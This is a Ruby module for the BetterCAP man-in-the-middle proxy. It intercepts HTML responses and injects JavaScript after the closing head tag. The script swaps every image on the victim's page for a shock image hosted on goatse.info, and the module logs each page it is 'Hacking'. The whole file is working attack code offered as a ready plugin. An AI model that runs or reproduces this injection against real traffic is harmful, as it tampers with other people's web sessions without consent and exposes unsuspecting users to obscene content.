=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end
class Gotse < Proxy::Module
  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^text\/html.*/
      Logger.info "Hacking http://#{request.host}#{request.url}"
      # make sure to use sub! or gsub! to update the instance
      response.body.sub!( '</head>', '</head> <script type="text/javascript" charset="utf-8">
	(function(){ function a(){ for (var i = document.getElementsByTagName("img").length - 1; i >= 0; i--) { document.getElementsByTagName("img")[i].src = "http://goatse.info/hello.jpg";};}window.onload = a;a();})();
</script>' )
    end
  end
end
